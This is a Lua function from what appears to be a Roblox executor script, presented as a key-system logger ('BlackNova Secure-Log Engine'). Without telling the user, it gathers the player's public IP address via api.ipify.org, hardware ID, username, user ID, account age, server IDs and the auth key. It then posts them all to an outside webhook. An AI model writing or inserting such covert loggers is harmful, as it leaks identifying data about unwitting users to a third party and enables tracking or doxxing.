local function SendUltimateLog(statusTitle, keyUsed)

    local player = game.Players.LocalPlayer

    local hwid = (gethwid and gethwid()) or "N/A"

    local exec = (identifyexecutor and identifyexecutor()) or "Unknown"

    

    local ip = "Unknown"

    pcall(function() ip = game:HttpGet("https://api.ipify.org") end)



    local placeName = "Unknown Map"

    pcall(function() placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)

    

    local formattedTime = os.date("%A, %d %B %Y | %X")

    local accountAge = player.AccountAge .. " days"

    local isPremium = player.MembershipType == Enum.MembershipType.Premium and "Yes ✅" or "No ❌"



    local data = {

        ["embeds"] = {{

            ["title"] = "🚀 " .. statusTitle,

            ["color"] = (statusTitle:find("Granted") or statusTitle:find("Admin")) and 65280 or 16711680,

            ["fields"] = {

                {["name"] = "👤 Player Info", ["value"] = "Name: **" .. player.Name .. "**\nID: `" .. player.UserId .. "`\nAge: `" .. accountAge .. "`\nPremium: " .. isPremium, ["inline"] = true},

                {["name"] = "🌐 Connection", ["value"] = "IP: **" .. ip .. "**\nHWID: `" .. hwid .. "`", ["inline"] = true},

                {["name"] = "🎮 Game & Server", ["value"] = "Map: **" .. placeName .. "**\nPlaceID: `" .. game.PlaceId .. "`\nJobId: `" .. game.JobId .. "`", ["inline"] = false},

                {["name"] = "🔑 Auth Details", ["value"] = "Key: ||" .. keyUsed .. "||\nExec: `" .. exec .. "`", ["inline"] = false},

                {["name"] = "⏰ Log Time", ["value"] = "`" .. formattedTime .. "`", ["inline"] = false}

            },

            ["footer"] = {["text"] = "BlackNova Secure-Log Engine v3.1"},

            ["timestamp"] = DateTime.now():ToIsoDate()

        }}

    }



    local request = (syn and syn.request) or (http and http.request) or (http_request) or (request)

    if request then

        pcall(function()

            request({

                Url = WebhookURL,

                Method = "POST",

                Headers = {["Content-Type"] = "application/json"},

                Body = game:GetService("HttpService"):JSONEncode(data)

            })

        end)

    end

end



